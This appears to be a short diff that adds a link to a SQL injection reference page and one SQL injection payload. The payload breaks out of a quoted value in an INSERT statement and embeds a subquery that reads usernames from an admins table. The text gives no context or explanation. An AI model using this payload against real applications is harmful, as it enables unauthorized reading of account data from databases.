@@ -1,0 +1,3 @@
+https://websec.ca/kb/sql_injection
+
+insert !:WELCOME', (select username from admins ))#);
